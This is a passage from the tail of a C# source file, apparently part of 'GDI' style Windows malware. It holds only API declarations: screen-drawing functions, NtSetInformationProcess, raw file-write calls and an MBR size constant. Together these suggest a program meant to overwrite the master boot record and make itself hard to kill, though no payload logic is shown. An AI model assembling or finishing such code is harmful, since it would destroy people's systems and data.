            Environment.Exit(-1);
        }
    }


    [DllImport("gdi32.dll")]
    public static extern IntPtr SelectObject([In] IntPtr hdc, [In] IntPtr hgdiobj);

    [DllImport("gdi32.dll")]
    private static extern IntPtr CreateSolidBrush(uint crColor);

    [DllImport("gdi32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool DeleteObject([In] IntPtr hObject);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr GetDC(IntPtr hWnd);

    [DllImport("user32.dll")]
    private static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);

    [DllImport("gdi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool BitBlt([In] IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, [In] IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

    [DllImport("gdi32.dll")]
    private static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, CopyPixelOperation dwRop);

    [DllImport("user32.dll")]
    private static extern bool RedrawWindow(IntPtr hWnd, IntPtr lprcUpdate, IntPtr hrgnUpdate, RedrawWindowFlags flags);

    [DllImport("gdi32.dll")]
    static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest,
int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
TernaryRasterOperations dwRop);
    public enum TernaryRasterOperations
    {
        SRCCOPY = 0x00CC0020, // dest = source
        SRCPAINT = 0x00EE0086, // dest = source OR dest
        SRCAND = 0x008800C6, // dest = source AND dest
        SRCINVERT = 0x00660046, // dest = source XOR dest
        SRCERASE = 0x00440328, // dest = source AND (NOT dest)
        NOTSRCCOPY = 0x00330008, // dest = (NOT source)
        NOTSRCERASE = 0x001100A6, // dest = (NOT src) AND (NOT dest)
        MERGECOPY = 0x00C000CA, // dest = (source AND pattern)
        MERGEPAINT = 0x00BB0226, // dest = (NOT source) OR dest
        PATCOPY = 0x00F00021, // dest = pattern
        PATPAINT = 0x00FB0A09, // dest = DPSnoo
        PATINVERT = 0x005A0049, // dest = pattern XOR dest
        DSTINVERT = 0x00550009, // dest = (NOT dest)
        BLACKNESS = 0x00000042, // dest = BLACK
        WHITENESS = 0x00FF0062, // dest = WHITE
        hmm = 0x00100C85 // Hmm, wtf is this?!?!
    };

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

    [DllImport("kernel32")]
    private static extern IntPtr CreateFile(
string lpFileName,
uint dwDesiredAccess,
uint dwShareMode,
IntPtr lpSecurityAttributes,
uint dwCreationDisposition,
uint dwFlagsAndAttributes,
IntPtr hTemplateFile);
    [DllImport("kernel32")]
    private static extern bool WriteFile(
IntPtr hFile,
byte[] lpBuffer,
uint nNumberOfBytesToWrite,
out uint lpNumberOfBytesWritten,
IntPtr lpOverlapped);

    private const uint GenericRead = 0x80000000;
    private const uint GenericWrite = 0x40000000;
    private const uint GenericExecute = 0x20000000;
    private const uint GenericAll = 0x10000000;

    private const uint FileShareRead = 0x1;
    private const uint FileShareWrite = 0x2;

    //dwCreationDisposition
    private const uint OpenExisting = 0x3;

    //dwFlagsAndAttributes
    private const uint FileFlagDeleteOnClose = 0x4000000;

    private const uint MbrSize = 512u;
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hHandle);
}
